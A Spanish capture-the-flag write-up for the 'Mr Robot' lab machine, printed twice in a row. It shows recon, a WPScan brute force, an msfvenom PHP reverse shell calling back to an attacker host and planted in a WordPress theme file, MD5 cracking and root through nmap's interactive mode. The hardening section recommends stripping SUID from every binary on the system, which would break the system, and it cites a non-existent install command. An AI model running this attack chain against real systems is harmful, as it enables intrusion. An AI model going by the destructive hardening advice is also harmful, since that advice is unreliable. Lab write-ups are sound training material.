# **Explotación de Máquina "Mr Robot"**

![Dificultad: Intermedia](https://img.shields.io/badge/Dificultad-Intermedia-orange) ![Categoría: Web](https://img.shields.io/badge/Categoría-Web-blue) ![CVSS: 8.1](https://img.shields.io/badge/CVSS-8.1-red)

## **Descripción Técnica**
Análisis de penetración a máquina virtual basada en la serie Mr. Robot que explota:
1. Credenciales débiles en WordPress
2. Vector de inyección PHP via plantillas
3. Escalada de privilegios mediante SUID y hash cracking

**Tiempo estimado**: 45-60 minutos  
**Nivel de complejidad**: Intermedio  
**Sistema operativo**: Linux (WordPress 4.3.1)

## **Índice Analítico**
1. [Reconocimiento Inicial](#reconocimiento)
2. [Análisis de Vulnerabilidades](#análisis)
3. [Explotación Web](#explotación-web)
4. [Post-Explotación](#post-explotación)
5. [Lecciones Aprendidas](#conclusión)

## **Reconocimiento**

### 1. Escaneo de Puertos
```bash
nmap -sV -sC -p- --min-rate 5000 -Pn -n -vvv 10.10.75.121 -oA full_scan
```
**Resultados**:
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 80/tcp | HTTP     | Apache 2.4.18 |
| 443/tcp| HTTPS    | OpenSSL 1.0.2g |

### 2. Enumeración Web
```bash
curl -s http://10.10.75.121/robots.txt | grep "Disallow"
```
**Hallazgos**:
- `/fsocity.dic` (diccionario con 858k entradas)
- `/key-1-of-3.txt` (primera flag)

## **Análisis**

### 3. Optimización de Diccionario
```bash
cat fsocity.dic | sort -u | uniq > cleaned_dict.txt
```
**Reducción**: 858k → 11.5k líneas únicas

### 4. Fuerza Bruta con WPScan
```bash
wpscan --url http://10.10.75.121/wp-login.php -U elliot -P cleaned_dict.txt -t 30
```
**Credenciales comprometidas**:
- Usuario: elliot
- Contraseña: ER28-0652

## **Explotación Web**

### 5. Inyección PHP via Editor de Temas
```bash
msfvenom -p php/reverse_php LHOST=10.0.2.15 LPORT=443 -f raw > shell.php
```
**Método de ejecución**:
1. Editar 404.php en Appearance → Theme Editor
2. Acceder a ruta inexistente para trigger

## **Post-Explotación**

### 6. Tratamiento de Shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### 7. Crackeo de Hash MD5
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
**Resultado**: 
- Hash: c3fcd3d76192e4007dfb496cca67e13b
- Password: abcdefghijklmnopqrstuvwxyz

### 8. Escalada Final con Nmap
```bash
nmap --interactive
nmap> !sh
whoami  # root
```

## **Conclusión Técnica**

### Matriz de Riesgos
| Vulnerabilidad | CVSS | Impacto |
|---------------|------|---------|
| Weak WordPress Credentials | 8.8 | Crítico |
| Unrestricted File Upload | 8.0 | Alto |
| Privilege Escalation via SUID | 7.8 | Alto |

### Recomendaciones
1. **Para WordPress**:
```bash
# Limitar intentos de login
install-plugin limit-login-attempts-reloaded
```
2. **Para el sistema**:
```bash
# Eliminar SUID peligrosos
find / -perm -4000 -exec chmod u-s {} \;
```

**Stack Tecnológico**:
- `nmap` 7.92+
- `wpscan` 3.8.22
- `hashcat` 6.2.5
- `metasploit-framework` 6.1+

**Referencias**:
1. [WPScan Vulnerability Database](https://wpscan.com/vulnerabilities)
2. [NIST SP 800-123: Web Security](https://csrc.nist.gov/publications/detail/sp/800-123/final)
3. [Linux Privilege Escalation Guide](https://github.com/swisskyrepo/PayloadsAllTheThings)# **Explotación de Máquina "Mr Robot"**

![Dificultad: Intermedia](https://img.shields.io/badge/Dificultad-Intermedia-orange) ![Categoría: Web](https://img.shields.io/badge/Categoría-Web-blue) ![CVSS: 8.1](https://img.shields.io/badge/CVSS-8.1-red)

## **Descripción Técnica**
Análisis de penetración a máquina virtual basada en la serie Mr. Robot que explota:
1. Credenciales débiles en WordPress
2. Vector de inyección PHP via plantillas
3. Escalada de privilegios mediante SUID y hash cracking

**Tiempo estimado**: 45-60 minutos  
**Nivel de complejidad**: Intermedio  
**Sistema operativo**: Linux (WordPress 4.3.1)

## **Índice Analítico**
1. [Reconocimiento Inicial](#reconocimiento)
2. [Análisis de Vulnerabilidades](#análisis)
3. [Explotación Web](#explotación-web)
4. [Post-Explotación](#post-explotación)
5. [Lecciones Aprendidas](#conclusión)

## **Reconocimiento Inicial**

### 1. Escaneo de Puertos
```bash
nmap -sV -sC -p- --min-rate 5000 -Pn -n -vvv 10.10.75.121 -oA full_scan
```
**Resultados**:
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 80/tcp | HTTP     | Apache 2.4.18 |
| 443/tcp| HTTPS    | OpenSSL 1.0.2g |

### 2. Enumeración Web
```bash
curl -s http://10.10.75.121/robots.txt | grep "Disallow"
```
**Hallazgos**:
- `/fsocity.dic` (diccionario con 858k entradas)
- `/key-1-of-3.txt` (primera flag)

## **Análisis de Vulnerabilidades**

### 3. Optimización de Diccionario
```bash
cat fsocity.dic | sort -u | uniq > cleaned_dict.txt
```
**Reducción**: 858k → 11.5k líneas únicas

### 4. Fuerza Bruta con WPScan
```bash
wpscan --url http://10.10.75.121/wp-login.php -U elliot -P cleaned_dict.txt -t 30
```
**Credenciales comprometidas**:
- Usuario: elliot
- Contraseña: ER28-0652

## **Explotación Web**

### 5. Inyección PHP via Editor de Temas
```bash
msfvenom -p php/reverse_php LHOST=10.0.2.15 LPORT=443 -f raw > shell.php
```
**Método de ejecución**:
1. Editar 404.php en Appearance → Theme Editor
2. Acceder a ruta inexistente para trigger

## **Post-Explotación**

### 6. Tratamiento de Shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### 7. Crackeo de Hash MD5
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
**Resultado**: 
- Hash: c3fcd3d76192e4007dfb496cca67e13b
- Password: abcdefghijklmnopqrstuvwxyz

### 8. Escalada Final con Nmap
```bash
nmap --interactive
nmap> !sh
whoami  # root
```

## **Conclusión**

### Matriz de Riesgos
| Vulnerabilidad | CVSS | Impacto |
|---------------|------|---------|
| Weak WordPress Credentials | 8.8 | Crítico |
| Unrestricted File Upload | 8.0 | Alto |
| Privilege Escalation via SUID | 7.8 | Alto |

### Recomendaciones
1. **Para WordPress**:
```bash
# Limitar intentos de login
install-plugin limit-login-attempts-reloaded
```
2. **Para el sistema**:
```bash
# Eliminar SUID peligrosos
find / -perm -4000 -exec chmod u-s {} \;
```

> 🔐 **Aviso Ético**: Todo contenido es para fines educativos en entornos controlados. El hacking no autorizado es ilegal.

---

**Stack Tecnológico**:
- `nmap` 7.92+
- `wpscan` 3.8.22
- `hashcat` 6.2.5
- `metasploit-framework` 6.1+

**Referencias**:
1. [WPScan Vulnerability Database](https://wpscan.com/vulnerabilities)
2. [NIST SP 800-123: Web Security](https://csrc.nist.gov/publications/detail/sp/800-123/final)
3. [Linux Privilege Escalation Guide](https://github.com/swisskyrepo/PayloadsAllTheThings)
